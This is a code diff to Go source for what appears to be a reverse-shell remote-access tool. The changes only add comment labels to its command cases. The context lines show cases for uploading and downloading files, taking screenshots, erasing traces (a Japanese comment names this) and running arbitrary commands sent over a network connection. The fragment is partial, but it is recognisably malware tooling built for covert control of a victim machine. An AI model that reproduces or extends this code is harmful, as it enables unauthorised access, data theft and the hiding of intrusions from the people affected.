@@ -79,7 +79,7 @@ func runShell(conn net.Conn) error {
 			os.Chdir(string(dir))
 
 		case "upload":
-			//upload
+			//execUpload
 			filePath := strings.Split(commands[len(commands)-1], "/")
 			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
 			//dir := "upload/"
@@ -153,6 +153,7 @@ func runShell(conn net.Conn) error {
 			fmt.Println("screenshot finished")
 
 		case "download": //ex: download [path]
+			//execDownload
 			//ファイルシステム構築
 			rootPath := commands[len(commands)-1]
 			fsys := os.DirFS(rootPath)
@@ -223,6 +224,7 @@ func runShell(conn net.Conn) error {
 			}
 
 		case "clean_sh": //痕跡消去 ex: clean_go_reversh
+			//execCleanSh
 			//tips/main11.goを参考
 			fmt.Println("CLEAN")
 
@@ -233,6 +235,7 @@ func runShell(conn net.Conn) error {
 			os.Exit(0)
 
 		default:
+			//execCommand
 			var cmd *exec.Cmd
 			//mac linux or windows
 			if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
